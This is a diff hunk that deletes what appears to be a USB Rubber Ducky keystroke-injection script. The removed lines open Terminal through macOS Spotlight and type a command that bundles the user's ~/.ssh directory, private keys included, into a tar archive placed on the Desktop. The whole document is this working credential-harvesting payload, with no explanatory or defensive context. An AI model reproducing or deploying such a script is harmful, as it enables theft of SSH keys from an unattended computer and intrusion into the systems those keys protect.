@@ -1,8 +1,0 @@
-DELAY 1000
-GUI SPACE
-DELAY 500
-STRING Terminal
-ENTER
-DELAY 500
-STRING tar -cvf ssh_keys.tar ~/.ssh && mv ssh_keys.tar ~/Desktop/ssh_keys.tar
-ENTER
